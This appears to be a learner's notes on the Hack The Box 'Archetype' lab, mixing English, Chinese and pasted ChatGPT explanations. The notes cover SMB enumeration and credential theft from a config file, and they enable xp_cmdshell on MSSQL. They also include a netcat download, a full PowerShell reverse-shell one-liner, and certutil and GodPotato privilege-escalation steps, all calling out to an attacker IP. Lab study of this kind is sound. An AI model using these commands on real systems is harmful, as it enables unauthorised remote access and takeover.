nmap 10.129.95.187 -sCV -A  
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2024-07-19 10:08 CEST  
Nmap scan report for 10.129.95.187  
Host is up (0.022s latency).  
Not shown: 995 closed tcp ports (conn-refused)  
PORT STATE SERVICE VERSION  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
445/tcp open microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds  
1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM  
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback  
| Not valid before: 2024-07-19T07:08:04  
|_Not valid after: 2054-07-19T07:08:04  
|_ssl-date: 2024-07-19T08:08:49+00:00; 0s from scanner time.  
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)  
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)  
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:  
| smb-os-discovery:  
| OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)  
| Computer name: Archetype  
| NetBIOS computer name: ARCHETYPE\x00  
| Workgroup: WORKGROUP\x00  
|_ System time: 2024-07-19T01:08:43-07:00  
|_clock-skew: mean: 1h45m00s, deviation: 3h30m01s, median: 0s_  
_| smb2-security-mode:_  
_| 3:1:1:_  
_|_ Message signing enabled but not required  
| smb-security-mode:  
| account_used: guest  
| authentication_level: user  
| challenge_response: supported  
|_ message_signing: disabled (dangerous, but default)  
| smb2-time:  
| date: 2024-07-19T08:08:42  
|_ start_date: N/A

  

  

```JavaScript
smbclient //10.129.95.187/backups  -N -c "prompt OFF; recurse ON; mget *"
```

so, we can get Password=M3g4c0rp123; User ID=ARCHETYPE\sql_svc;

```SQL
M3g4c0rp123
```

```JavaScript
smbclient //10.129.95.187/backups -U ARCHETYPE\\sql_svc -p M3g4c0rp123 -c "prompt OFF; recurse ON; mget *"
 sqlcmd -S 10.129.250.51  -U "ARCHETYPE\sql_svc" -P "M3g4c0rp123"
```

I can understand mssqlclient and sqlcmd, but smbclient.py, smbexec, wmiexex and psexec?

## 格式分析

```Plain
ARCHETYPE\sql_svc

```

- 这里的格式是 **域账号格式**：

```Plain
<域名>\<用户名>

```

### ChatGPT 說：

Ah, I see — you understand `**sqlcmd**` and `**mssqlclient.py**` because they directly talk to **SQL Server**, but you’re confused about why **SMB/WMI tools** (`smbclient.py`, `smbexec.py`, `wmiexec.py`, `psexec.py`) are relevant. Let me explain carefully.

---

## 1️⃣ The key: SQL account vs Windows account

- The account from `prod.dtsConfig` is:

```Plain
ARCHETYPE\sql_svc
M3g4c0rp123

```

- It’s **not just a SQL Server login**.
- It’s a **Windows domain account** (`ARCHETYPE\sql_svc`) that happens to also be used for SQL Server authentication.

✅ This is common in Windows environments: a service account runs SQL Server, and the **same Windows account** can log into the host machine (or other machines in the domain).

---

## 2️⃣ What these tools do

|Tool|What it does|How it relates to your SQL account|
|---|---|---|
|`**smbclient.py**`|Connects to SMB shares (file shares) on a host|If `sql_svc` has file permissions, you can list/download files|
|`**smbexec.py**`|Execute commands remotely via SMB & service creation|Uses Windows authentication; works if `sql_svc` has local admin rights|
|`**wmiexec.py**`|Execute commands remotely via WMI (RPC)|Uses Windows creds to run commands without a shell service installed|
|`**psexec.py**`|Create a service to get remote shell|Needs Windows privileges; uses `sql_svc` Windows login|

```BNF
smbexec.py ARCHETYPE\sql_svc@10.129.250.51
 wmiexec.py ARCHETYPE\sql_svc:M3g4c0rp123@10.129.250.51
```

```BNF
 sqlcmd -S 10.129.250.51  -U "ARCHETYPE\sql_svc" -P "M3g4c0rp123"
 
 SELECT DB_NAME();
 GO
 SELECT name FROM sys.databases;
 GO
```

  

  

  

DTS（Data Transformation Services）

because the user ID is ARCHETYPE\sql_svc; ,so it is a user for mssql.

also 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM

CAN USE sqlcmd and mssqlclient

```JavaScript
mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187  -windows-auth

sqlcmd -S 10.129.95.187 -U ARCHETYPE\\sql_svc -P M3g4c0rp123 

check if we are admin

1> SELECT is_srvrolemember(‘sysadmin’);
2> go
Msg 102, Level 15, State 1, Server ARCHETYPE, Line 1
Incorrect syntax near '‘'.
1>



1>  EXEC xp_cmdshell 'net user';
2> go
output                                                                                                                                                                                                                                                         
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
NULL                                                                                                                                                                                                                                                           
User accounts for \\ARCHETYPE                                                                                                                                                                                                                                  
NULL                                                                                                                                                                                                                                                           
-------------------------------------------------------------------------------                                                                                                                                                                                
Administrator            DefaultAccount           Guest                                                                                                                                                                                                        
sql_svc                  WDAGUtilityAccount                                                                                                                                                                                                                    
The command completed successfully.                                                                                                                                                       
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
GO

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

1> exec xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.180:80/nc64-32.exe -outfile nc64-32.exe"
2> go
1> exec xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; ./nc64-32.exe -e cmd.exe 10.10.14.180 9999"
2> go

```

```SQL
EXEC xp_cmdshell 'whoami'

```

how to open xp_cmdshell

```SQL
EXEC sp_configure 'show advanced options', 1; 
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

for winpeas better display

```SQL
 REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

  

**What script can be used in order to search possible paths to escalate privileges on Windows hosts?**

  

WinPEAS

  

**What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?**

**问题：可以使用M**icrosoft **SQ**L **Server的哪些**扩展存储过程来生成 **Wind**ows **she**ll？

xp_cmdshell

The extended stored procedure in Microsoft SQL Server that can be used to spawn a Windows command shell is:

xp_cmdshell

This powerful procedure allows execution of operating system commands and programs from within SQL Server. When enabled and executed, xp_cmdshell spawns a Windows command shell and passes in a string to be executed as a command-line statement.

Key points about xp_cmdshell:

1. It's disabled by default in modern SQL Server installations due to security concerns.
2. It requires sysadmin privileges to use.
3. To enable it, you typically need to run:  
    EXEC sp_configure 'show advanced options', 1;  
    RECONFIGURE;  
    EXEC sp_configure 'xp_cmdshell', 1;  
    RECONFIGURE;
4. Usage example:  
    EXEC xp_cmdshell 'command_here';
5. It's considered a significant security risk if misused, as it allows direct interaction with the operating system.
6. Many organizations and security best practices recommend keeping it disabled unless absolutely necessary.
7. Its use is often flagged by security auditing tools.

Remember, using xp_cmdshell or similar powerful features without proper authorization could be illegal and unethical. Always ensure you have appropriate permissions and are following security best practices when working with database systems.

admin

```SQL
MEGACORP_4dm1n!!
```

```SQL
wmiexec.py administrator@10.129.19.59
psexec.py administrator@10.129.19.59
```

  

one cmd shell, nc in 4444

```BNF
EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(''10.10.15.77'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}"';

```

PS C:\windows\temp> certutil -urlcache -split -f [http://10.10.15.77/PrintSpoofer64.exe](http://10.10.15.77/PrintSpoofer64.exe) 1.exe  
**** Online ****  
0000 ...  
6a00  
CertUtil: -URLCache command completed successfully.  
PS C:\windows\temp> ls  
PS C:\windows\temp> dir  
PS C:\windows\temp> certutil -urlcache -split -f [http://10.10.15.77/PrintSpoofer64.exe](http://10.10.15.77/PrintSpoofer64.exe) .\1.exe  
**** Online ****  
0000 ...  
6a00  
CertUtil: -URLCache command completed successfully.  
PS C:\windows\temp> ls  
PS C:\windows\temp> dir C:\Windows\Temp\1.exe

  

```BNF
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 10.10.15.77 8888"
```

```BNF
.\GodPotato.exe -cmd "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -File C:\Windows\Temp\rev.ps1"
```